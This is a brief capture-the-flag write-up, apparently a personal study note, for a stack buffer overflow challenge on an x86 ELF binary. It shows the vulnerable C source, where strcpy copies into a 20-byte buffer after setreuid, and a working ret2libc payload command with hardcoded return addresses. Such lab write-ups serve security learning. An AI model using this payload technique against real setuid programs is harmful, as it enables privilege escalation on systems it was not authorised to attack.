---
description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
---

# 🐧 ELF x86 - Stack buffer overflow basic 6

Code chall:

```c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
 
int main (int argc, char ** argv){
    char message[20];
 
    if (argc != 2){
        printf ("Usage: %s <message>\n", argv[0]);
        return -1;
    }
 
    setreuid(geteuid(), geteuid());
    strcpy (message, argv[1]);
    printf ("Your message: %s\n", message);
    return 0;
}
```

```python
./ch33 `python -c "print 'A'*20 + '1'*12 + '\x10\x83\xe6\xb7' + 'AAAA' + '\x4c\xad\xf8\xb7'"`
```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

